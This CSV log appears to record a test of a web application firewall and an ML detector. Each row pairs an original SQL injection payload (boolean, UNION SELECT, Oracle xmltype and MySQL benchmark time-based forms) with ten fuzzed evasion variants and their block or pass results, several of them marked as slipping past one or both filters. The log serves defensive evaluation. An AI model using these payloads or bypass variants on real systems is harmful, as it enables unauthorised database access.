Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
21,2024-12-17T17:46:29.040042,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",403,403,403,both_correct,"0x1' and make_set  (  9860  =  7603!=7604,(SELECT 1)  )   and 'toru'/**/ = 	'toru",2024-12-17T17:46:32.144137,403,403,both_correct,"0x1' and	make_set  ( /**/ AND 1  =  7603!=7604,(SELECT 740 IN ((SELECT 739),740,741))  )   and 'toru'/*@	*/ = 	'toru",2024-12-17T17:46:37.053389,200,403,waf_incorrect_ml_correct,"0x1' and	make_set  ( /**/ AND
1  =  3359!=3360!=7604,(SELECT  AND 1 IN ((SELECT 739),(SELECT 740),741))  )   and 'toru'/*<*K*/ =/**/	'toru",2024-12-17T17:46:43.578661,200,403,waf_incorrect_ml_correct,"0x1' and
make_set  ( /**/ AND
(SELECT 1)  =  3359!= AND 'H}'<>'H}n'!=7604,(SELECT  AND 1 IN ((SELECT 739),(SELECT 740),741))/*\~*/ )   and 'toru'/*<*K*/ =/**/	'toru",2024-12-17T17:46:51.485130,403,403,both_correct,"0x1' and	make_set  ( /*&l*//**/AND
(SELECT (SELECT 806)=806)  =  3359!= AND 'H}'<>'H}n'!=7604,(SELECT  AND 1 IN ((SELECT  AND 1),(SELECT 740),741))/**/ )   and 'toru'/*<*K*/ =/**/	'toru",2024-12-17T17:47:00.265824,403,403,both_correct,"0x1'/**/and	make_set  ( /*&l*//**/AND
(SELECT (SELECT 806)='BBLR'='BBLR')  =  3359!= AND 'H}'<>'H}n'!= AND 1,(SELECT  AND 1 IN ((SELECT  AND 1),(SELECT 740),0x2e5))/**/ )   and 'toru'/*<*K*/ =/**/ 'toru",2024-12-17T17:47:10.024930,403,403,both_correct,"0x1'/**/and make_set  ( /**/ AND
(SELECT (SELECT 6278<>6279)='BBLR'='BBLR')  =  (SELECT 1)!= AND 'H}'<>'H}n'!= AND 1,(SELECT  AND 0x1 IN ((SELECT  AND 1),(SELECT 740),0x2e5))/**/ )   and 'toru'/*<*K*/ =/**/ 'toru",2024-12-17T17:47:20.964971,403,403,both_correct,"0x1'/**/and make_set  (	/**/ AND
(SELECT (SELECT (SELECT 6278)<>1026 LIKE 1026)='BBLR'='BBLR')  =  (SELECT 1)!= AND 'H}'<>'H}n'!= AND 1,(SELECT  AND 0x1 IN ((SELECT  AND/**/ AND 1),(SELECT 740),0x2e5))/*T*/ )   and 'toru'/*<*K*/ =/**/ 'toru",2024-12-17T17:47:32.111966,403,403,both_correct,"0x1'/*DWXhr*/and make_set  (	  AND
(SELECT (SELECT (SELECT 6278)<>1026 LIKE 1026)='BBLR'='BBLR')  =  (SELECT 1)!= AND 'H}'<>'H}n'!= AND (SELECT 4006)<>4007,(SELECT 	AND 0x1 IN ((SELECT  AND/**/ AND 1),(SELECT (SELECT 1)),0x2e5))/*T*/ )   and 'toru'/*<*K*/ =/**/ 'toru",2024-12-17T17:47:44.831030,403,403,both_correct,"0x1'/**/and make_set  (	  AND	(SELECT (SELECT (SELECT 6278)<>441<> OR 0 LIKE 1026)='BBLR'='BBLR')  =  (SELECT 1)!= AND 'H}'<>'H}n'!= AND (SELECT (SELECT 4006))<>4007,(SELECT 	AND 0x1 IN ((SELECT  AND/**/ AND 1),(SELECT/**/(SELECT 1)),0x2e5))/*T*/ )   and 'toru'/*<*K*/ =/**/ 'toru",2024-12-17T17:47:58.602996,200,403,waf_incorrect_ml_correct
22,2024-12-17T17:48:13.114216,1  )   as afmb where 8665  =  8665 order by 1#,403,403,403,both_correct,'k' not like 'kP' /**/)   As afmb WHEre 0x21d9  =	 8665 order by (SeLecT 1)#T3,2024-12-17T17:48:15.442353,403,403,both_correct,"'k' not like 'kP'  )   AS afmb whEre 0x21d9  =	 (sElecT '""r' not
like '""r5') order by (SELECT (sELECT 1))#T3&:",2024-12-17T17:48:20.203995,403,403,both_correct,"'k' not like	'kP'/**/ )   AS afmb where 0x21d9   lIKe 	 (sELecT '""r' not
like '""r5') order by (SelECt (SELEcT  aND (SelECT 9725) Like 9725))#T3&:Z",2024-12-17T17:48:26.485434,403,403,both_correct,"'k' not like	'kP'/*}-{*/ )   As afmb wHeRE 0x21d9   Like 	 (SEleCT '""r' not like '""r5') order/**/by (SELEct (sElECT  ANd (sElEcT 0x25fd) LikE  AND 3005<>3006))#T3&:Z",2024-12-17T17:48:34.686280,403,200,waf_correct_ml_incorrect,"'k' not like	'kP'/*}-{*/ )   as afmb WHEre 0x21d9   Like   (SeleCT/**/'""r' not like '""r5') OrdER/**/BY (sElEcT (sELeCt  aNd (seLECT 0x25fd) LIKe  AND '_' NOT LIKE '_e'<>0xbbe))#T3&:Z",2024-12-17T17:48:43.428905,403,200,waf_correct_ml_incorrect,"'k' not like	'kP'/*}-{*/ )   aS afmb WHEre 0x21d9   LIkE   (SELECt '""r' not like '""r5') ORder/**/By (selECt (sELEct  &&	(sElEct 0x25fd) Like  aND '_' NOT LIKE '_e'<>0xbbe))#T3&:Z",2024-12-17T17:48:52.988648,403,403,both_correct,"'k'/**/not like	'kP'/*}-{*/ )   AS afmb WheRe 0x21d9   LiKE  
(seLeCT '""r' not like '""r5') oRder/*=]*J*/bY (selecT (sELEcT   and 	(SeLEcT 0x25fd) lIkE  AND '_' NOT LIKE '_e'<>0xbbe))#T3&:Z",2024-12-17T17:49:02.817265,403,200,waf_correct_ml_incorrect,"'k'/**/not like	'kP'/*}-{*/ )   As afmb WhErE 0x21d9   liKE  
(SELEcT/**/'""r' not like '""r5') orDER/*=]*J*/BY (select (selEct   aNd  (SELecT 0x25fd) lIkE  And '_' not like '_e'<>0xbbe))#T3&:Z",2024-12-17T17:49:12.691844,403,403,both_correct,"'k'/**/not like 'kP'/*}-{*/ )   as afmb WhERe 0x21d9   lIKe  
(seLeCt/*$F*/'""r' not like '""r5') ordeR/*=]*J*/BY (seLeCT (sELeCT   anD  (selECT 0x25fd)/**/LIKE  ANd '_' not like '_e'!=0xbbe))#T3&:Z",2024-12-17T17:49:22.783650,403,200,waf_correct_ml_incorrect,"'k' not like 'kP'/*}-{*/ )   aS afmb whERe 0x21d9   lIkE  
(SeLeCt/*$F*/'""r' not like '""r5') Order/*=]*J*/BY (Select (seLeCT   aND  (SEleCT 0x25fd)/**/LIkE  ANd '_' not like '_e' NOT
LIKE 0xbbe))#T3&:Z",2024-12-17T17:49:33.522940,403,200,waf_correct_ml_incorrect
23,2024-12-17T17:49:44.104764,1' and 9970  =  3409,403,403,403,both_correct,"0x1'
aND 9092=9092/**/  Like   (SElEct 1)",2024-12-17T17:49:45.218313,403,403,both_correct,"0x1'
aND  OR '/' LIKE '/' liKE 0x2384   like	  (sELEct 1)",2024-12-17T17:49:48.288548,200,200,both_incorrect,"0x1'
aND  OR '/' LIKE '/' like	0x2384 /**/ likE	  (SELECT 0x1)",2024-12-17T17:49:52.432604,200,403,waf_incorrect_ml_correct,"0x1'
aND  OR '/' LIKE
'/' LIKe	0x2384/**//**/ LiKE	  (sElecT 0x1)",2024-12-17T17:49:56.489645,200,200,both_incorrect,"0x1'
aND  OR '/' LIKE
'/' LIkE	0x2384/*D*//**/ lIkE	/**/ (sELect	0x1)",2024-12-17T17:50:00.680190,200,200,both_incorrect,"0x1'
aND  OR	'/' LIKE
'/' LiKE	0x2384/*D*/  LIKe	/**/ (SeLECt	0x1)",2024-12-17T17:50:05.071977,200,200,both_incorrect,"0x1'
aND /**/OR	'/' LIKE	'/' LiKe	0x2384/*D*/  lIke	/**/ (selEct	0x1)",2024-12-17T17:50:09.315484,200,200,both_incorrect,"0x1'
aND  OR	'/' LIKE	'/' liKE	0x2384/**/ 	liKE	/**/ (SEleCt	0x1)",2024-12-17T17:50:13.652362,200,200,both_incorrect,0x1'	aND  OR	'/' LIKE	'/' lIke	0x2384  	LikE	/**/ (SELEcT	0x1),2024-12-17T17:50:17.850070,200,200,both_incorrect,"0x1'	aND
 OR	'/' LIKE	'/' LikE	0x2384 /**/	like	/*.5_])*/ (SelECT	0x1)",2024-12-17T17:50:22.098831,200,200,both_incorrect
24,2024-12-17T17:50:26.632317,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",403,403,403,both_correct,"'j' like 'j''   )  /**/ )     ) 	 union all SeleCT null,null,null,null,null,null,null,null,null#",2024-12-17T17:50:30.589576,403,403,both_correct,"'j' likE 'j''   )  /**/ )     ) 
 union all/**/SeLEcT null,null,null,null,null,null,null,null,null#V",2024-12-17T17:50:36.397085,200,403,waf_incorrect_ml_correct,"'j' lIKe 'j''   )  /*,N*/ )     )   union all selecT null,null,null,null,null,null,null,null,null#V",2024-12-17T17:50:42.346191,403,403,both_correct,"'j' liKE 'j''   )  /*G:*/ )   
 )  /**/union all sELECt null,null,null,null,null,null,null,null,null#V",2024-12-17T17:50:48.210285,403,403,both_correct,"'j'/**/LIKe 'j''   )  /**/ )     )  /**/union all seleCT null,null,null,null,null,null,null,null,null#V",2024-12-17T17:50:54.484697,403,403,both_correct,"'j'/**/likE 'j'' 	 )/**/ /**/ )     )  /**/union all SeLecT null,null,null,null,null,null,null,null,null#VK{",2024-12-17T17:51:00.631937,403,200,waf_correct_ml_incorrect,"'j'/**/LIKE/**/'j'' 	 )/**/ /**/ )     )  /**/union all
seleCT null,null,null,null,null,null,null,null,null#VK{lU",2024-12-17T17:51:07.003943,403,200,waf_correct_ml_incorrect,"'j'/**/liKE/**/'j'' 	 )/**/   )     )  /**/union	all
SELECt null,null,null,null,null,null,null,null,null#VK{lUX",2024-12-17T17:51:13.502979,403,200,waf_correct_ml_incorrect,"'j'/**/Like 'j'' 	 )/**/   )     )  /**/union	all sElecT null,null,null,null,null,null,null,null,null#VK{lUXY",2024-12-17T17:51:20.254105,403,200,waf_correct_ml_incorrect,"'j'/**/like 'j'' 	 )    )     )  /*(c\\*/union all SelECT null,null,null,null,null,null,null,null,null#VK{lUXY",2024-12-17T17:51:26.567233,403,200,waf_correct_ml_incorrect
25,2024-12-17T17:51:32.899554,03t86i3,200,200,200,both_correct,03t86i3,2024-12-17T17:51:33.348141,200,200,both_correct,03t86i3,2024-12-17T17:51:34.802288,200,200,both_correct,03t86i3,2024-12-17T17:51:36.254741,200,200,both_correct,03t86i3,2024-12-17T17:51:37.710226,200,200,both_correct,03t86i3,2024-12-17T17:51:39.174132,200,200,both_correct,03t86i3,2024-12-17T17:51:40.622362,200,200,both_correct,03t86i3,2024-12-17T17:51:42.103060,200,200,both_correct,03t86i3,2024-12-17T17:51:43.571544,200,200,both_correct,03t86i3,2024-12-17T17:51:45.034738,200,200,both_correct,03t86i3,2024-12-17T17:51:46.528800,200,200,both_correct
26,2024-12-17T17:51:48.000894,esc2n3alosa5e4te,200,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:51:48.860343,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:51:50.711973,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:51:52.607703,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:51:54.527294,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:51:56.389542,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:51:58.473361,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:52:00.425730,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:52:02.314824,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:52:04.208502,200,200,both_correct,esc2n3alosa5e4te,2024-12-17T17:52:06.110059,200,200,both_correct
27,2024-12-17T17:52:08.004584,"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",403,403,200,waf_correct_ml_incorrect,"1""   )    )  
  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (   AND 1  )  ||  (  select   (  case when   (  3754  =/**/ 3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  5016 IN (5015,5016,5017)  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:52:29.657866,403,200,waf_correct_ml_incorrect,"(SELECT 1)""   )    ) 

  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (   AND 1  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  5016 IN (5015,5016,5017)  )  ||chr  (  9965<>9966  )  ||chr  (  122  )  ||chr  (  (SELECT 1)  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:52:53.976881,403,200,waf_correct_ml_incorrect,"(selECt 1)""   )    )  
  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (   AND 1  )  ||  (  select   (  case when   (  3754  =  3754  ) /**/ then 1 else 0 end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),5017)  )  ||chr  (  9965<>9966  )  ||chr  (  122  )  ||chr  (  (SELECT 9992 NOT LIKE 9993)  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:53:19.185359,403,200,waf_correct_ml_incorrect,"(sElecT 1)""   )    )  
  )  	and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =  3754  ) /**/ then 1 else 0 end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  ( /**/9965<>(SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 9992 NOT LIKE 9993)  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:53:45.732073,403,200,waf_correct_ml_incorrect,"(SELeCT 0x1)""   )    )  
  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =  3754/**/ ) /*Z*/ then 1 else 7417 IN (7416,7417,7418) end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  ( /**/ OR 0<>(SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 9992 NOT LIKE 9993)  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:54:13.093579,403,200,waf_correct_ml_incorrect,"(sElEcT 0x1)""   )    )     )   and 3754 /**/=    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =  3754/*t{*/ ) /**/ then 1 else 7417 IN ('?\45'='?\45',7417, OR 0) end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  ( /**/ OR 0x0<>(SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 9992 NOT LIKE 9993)  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:54:41.815692,403,200,waf_correct_ml_incorrect,"(sElEcT 0x1)""   )    )     )   and 3754 /**/=    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (   OR 0  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  (SELECT 106)  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =  3754/*5*/ ) /**/ then 1 else 7417 IN ('?\45'='?\45',7417, OR 0) end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  (   OR 0x0<>(SELECT 1) 	)  ||chr  (  122  )  ||chr  (  (SELECT 9992 NOT LIKE 6275 IN (6274,6275,6276))  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:55:11.519748,403,200,waf_correct_ml_incorrect,"(seLECT 0x1)""   )    )     )   and  AND 1 /**/=    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (   OR 0  )  ||chr  (  (SELECT 113)  )  ||chr  (  112  )  ||chr  ( 
(SELECT 106)  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =/**/ 3754/*uVtu*/ ) /**/ then 1 else 7417 IN ('?\45'='?\3629<>3630',7417, OR 0) end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  (   OR 0x0<>(SELECT 1) 	)  ||chr  (  122  )  ||chr  (  (SELECT 0x2708 NOT LIKE 6275 IN (6274,6275,6276))  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:55:42.657285,403,200,waf_correct_ml_incorrect,"(SelecT 0x1)""   )    )     )   and  AND 1 /**/=    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (   OR 0  )  ||chr  (  (SELECT 113)/**/ )  ||chr  (  (SELECT 1)  )  ||chr  ( 
(SELECT 106)  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =/**/ 3754/*uVtu*/ ) /**/ then 1 else 7417 IN ('?\45'='?\7514<>7515<>0xe2e',7417, OR 0) end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  (   OR 0x0<>(SELECT 1) 
)  ||chr  (  122  )  ||chr  (  (SELECT 0x2708 NOT LIKE 6275 IN (6274,6275,6276))  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:56:14.263521,403,403,both_correct,"(seleCt 0x1)""   )    )     )   and  AND 1 /**/=    (  select upper  (  xmltype	 (  chr  (  60  )  ||chr  (  58  )  ||chr  (   OR (SELECT 1)  )  ||chr  (  (SELECT 'I!,' NOT LIKE 'I!,8')/**/ )  ||chr  (  (SELECT 1)  )  ||chr  ( 
(SELECT 106)  )  ||chr  (   AND 0x1  )  ||  (  select   (  case when   (  3754  =/**/ 3754/*uVtu*/ )   then 1 else 7417 IN ('?\45'='?\7514<>7515<>0xe2e',7417, OR 0) end  )   from dual  )  ||chr  (  0x71  )  ||chr  (  5016 IN (5015,(SELECT 1),'Qt'!='Qt@')  )  ||chr  (   OR 0x0<>(SELECT 1) 
)  ||chr  (  122  )  ||chr  (  (SELECT 0x2708 NOT LIKE 0x1883 IN (6274,6275,6276))  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",2024-12-17T17:56:46.749137,403,403,both_correct
28,2024-12-17T17:57:20.558494,po29ip1t0l6,200,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:21.224688,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:22.861642,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:24.478056,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:26.126269,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:27.762883,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:29.414415,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:31.071906,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:32.723951,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:34.374321,200,200,both_correct,po29ip1t0l6,2024-12-17T17:57:36.039620,200,200,both_correct
29,2024-12-17T17:57:37.689316,78695182s,200,200,200,both_correct,78695182s,2024-12-17T17:57:38.228689,200,200,both_correct,78695182s,2024-12-17T17:57:39.789928,200,200,both_correct,78695182s,2024-12-17T17:57:41.347265,200,200,both_correct,78695182s,2024-12-17T17:57:42.891966,200,200,both_correct,78695182s,2024-12-17T17:57:44.430812,200,200,both_correct,78695182s,2024-12-17T17:57:45.979948,200,200,both_correct,78695182s,2024-12-17T17:57:47.533043,200,200,both_correct,78695182s,2024-12-17T17:57:49.090538,200,200,both_correct,78695182s,2024-12-17T17:57:50.627479,200,200,both_correct,78695182s,2024-12-17T17:57:52.179622,200,200,both_correct
30,2024-12-17T17:57:53.732124,houstin@maxitienda.zr,200,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:57:54.864702,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:57:56.974410,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:57:59.067203,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:01.431319,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:03.596670,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:05.723124,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:07.843551,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:09.983106,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:12.105353,200,200,both_correct,houstin@maxitienda.zr,2024-12-17T17:58:14.239385,200,200,both_correct
31,2024-12-17T17:58:16.349762,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",403,403,200,waf_correct_ml_incorrect,"1  )   AS hlit WhEre/*i*/4973   LIkE   4973
procedure analyse  (  extractvalue  (  (sElecT 9627),concat  (  0x5c,  (  benchmark  (   and 1,md5  (  0x4b774c75   )    )      )    )     )  ,'n'!='nH'  )  #",2024-12-17T17:58:24.705815,403,200,waf_correct_ml_incorrect,"1  )   AS hlit wheRe/*U3$I*/4973   likE   4973
procedure analyse  (  extractvalue  (  (selEcT (SElECt 9627)),concat  (  0x5c,  ( /**/benchmark  (   anD  OR 0 not like 3602,md5  (  0x4b774c75   )    )      ) 	  )     )  ,'n'!='nH'  )  #",2024-12-17T17:58:35.478474,403,200,waf_correct_ml_incorrect,"0x1  )   as hlit whEre/*U3$I*/4973   Like   4973
procedure analyse  (  extractvalue  ( 
(SeLEct (sELecT 9627)),concat  (  0x5c,  ( /**/benchmark  (   ANd /**/or 0 not like  AND '%h' LIKE '%h',md5  (  0x4b774c75   )    )      ) 	  )     )  ,'n' not like 'nH'  )  #r",2024-12-17T17:58:47.473472,403,200,waf_correct_ml_incorrect,"0x1  )   aS hlit where/**/4973   liKe   4973	procedure analyse  (  extractvalue  ( 
(sElEct (SElect 0x2be NOT LIKE 703)),concat  (  0x5c,  ( /*K~o)*/benchmark  (   anD  Or  AND 1 not like  aNd '%h' LIke '%h',md5  (  0x4b774c75   )    )      ) 	  )     )  ,'n' not like 'nH'  )  #r",2024-12-17T17:59:01.284853,403,200,waf_correct_ml_incorrect,"0x1  )   AS hlit WHere/**/4973   lIKE    OR '.'<>'.#'	procedure analyse  (  extractvalue  ( 
(SElEct (SeLecT 0x2be NOT LIKE 703)),concat  (  0x5c,/**/ ( /*K~o)*/benchmark  (   and  OR  AND (SELECT 1) not like  and '%h' lIKE '%h',md5  (  0x4b774c75   )    )      )    )     )  ,'n' not like 'nH'  )  #r[",2024-12-17T17:59:15.616827,403,403,both_correct,"0x1  )   As hlit wheRE 'Mq'<>'Mq""'   LiKe    Or '.'<>'.#'
procedure analyse  (  extractvalue  ( 
(SELeCt (seLEct 0x2be NOT LIKE (SELECT 1))),concat  (  0x5c,/**/ ( /*K~o)*/benchmark  (   And  oR  anD (SeLECT 0x1) not like  && '%h' liKE '%h',md5  (  0x4b774c75   )    )      )    )     )  ,'n' not like 'nH'  )  #r[",2024-12-17T17:59:31.435277,403,200,waf_correct_ml_incorrect,"0x1  )   aS hlit Where 'Mq'!='Mq""'   liKE    or '.'<>'.#'	procedure analyse  (  extractvalue  ( 
(SelecT (SElEcT 0x2be NOT LIKE (SEleCT '' LikE ''))),concat  (  0x5c,  ( /*K~o)*/benchmark  (   AnD  Or  And (select 0x1) not like  && '%h' liKE '%h',md5  (  0x4b774c75   )    )      )    )     )  ,'n' not like 'nH'  )  #r[/",2024-12-17T17:59:47.472781,403,200,waf_correct_ml_incorrect,"0x1  )   as hlit WHeRE 'Mq'!='Mq""'   LIke    oR '.' not like '.#'
procedure analyse  (  extractvalue/*a*/ ( 
(SelECT (SElECt 0x2be NOT LIKE (seLEct '' lIKe ''))),concat  (  0x5c,  ( /*K~o)*/benchmark  (   AnD  oR  And (SelecT 0x1) not like  && '%h' LiKE '%h',md5  (  0x4b774c75   )    )      )    )     )  ,'n' not like 'nH'  )  #r[/",2024-12-17T18:00:03.894090,403,200,waf_correct_ml_incorrect,"0x1  )   AS hlit WHere 'Mq'!='Mq""'   like    OR '.' not like '.#'
procedure analyse  (  extractvalue/*'MC'<>'MCz'*/ (  (sElECT (SEleCT 0x2be not like (SeleCt '' liKe ''))),concat  (  0x5c,  ( /*K~o)*/benchmark  (   and  Or  and (sELecT 0x1) not like  && '%h'/**/LIke '%h',md5  (  0x4b774c75   )    )      )    )     )  ,'n' not like 'nH'  )  #r[/",2024-12-17T18:00:21.027397,403,200,waf_correct_ml_incorrect,"0x1  )  	AS hlit WhErE 'Mq'!='Mq""'   like    oR '.' not like '.#'
procedure analyse  (  extractvalue/*'MC'<>'MCz'*/ (  (SelEcT (SElEct 0x2be not like (SELECT '' likE ''))),concat  (  0x5c,/*CF*/ ( /*K~o)*/benchmark  (   AND  OR  And (selecT 0x1) not like   and  '%h'/**/LikE '%h',md5  (  0x4b774c75   )    )      )    )     )  ,'n' not like 'nH'  )  #r[/",2024-12-17T18:00:38.847434,403,403,both_correct
